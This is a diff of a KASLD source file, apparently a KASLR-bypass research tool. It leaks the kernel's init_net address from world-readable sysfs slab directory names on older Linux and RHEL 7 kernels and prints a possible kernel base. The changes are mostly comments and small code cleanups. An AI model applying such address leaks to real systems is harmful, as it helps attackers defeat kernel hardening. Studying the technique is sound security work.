@@ -1,21 +1,25 @@
 // This file is part of KASLD - https://github.com/bcoles/kasld
 //
-// Retrieve init_net kernel symbol virtual address from
-// /sys/kernel/slab/nf_conntrack_*
+// Retrieve `init_net` kernel symbol virtual address from SysFS
+// `/sys/kernel/slab/nf_conntrack_<pointer>` world-readable filename.
 //
-// Patched some time around 2016, but still present in RHEL 7.6 as of 2018.
+// Patched in kernel v4.6~2^2~2 on 2016-05-14:
+// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=31b0b385f69d8d5491a4bca288e25e63f1d945d0
+//
+// But still present in RHEL 7.7 as of 2019. Removed in RHEL 7.8.
 //
 // References:
 // https://www.openwall.com/lists/kernel-hardening/2017/10/05/5
+// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=31b0b385f69d8d5491a4bca288e25e63f1d945d0
 // ---
 // <bcoles@gmail.com>
 
-#define _GNU_SOURCE
+#define _DEFAULT_SOURCE
+#include "kasld.h"
 #include <dirent.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include "kasld.h"
 
 unsigned long get_kernel_addr_conntrack() {
   unsigned long addr = 0;
@@ -41,7 +45,7 @@ unsigned long get_kernel_addr_conntrack() {
 
     snprintf(d_path, sizeof(d_path), "%s", dir->d_name);
 
-    substr = (char *)memmem(d_path, sizeof(d_path), needle, strlen(needle));
+    substr = strstr(d_path, needle);
 
     if (substr == NULL)
       continue;
@@ -65,7 +69,7 @@ int main(int argc, char **argv) {
     return 1;
 
   printf("leaked init_net: %lx\n", addr);
-  printf("possible kernel base: %lx\n", addr &~ KERNEL_BASE_MASK);
+  printf("possible kernel base: %lx\n", addr & ~KERNEL_BASE_MASK);
 
   return 0;
 }
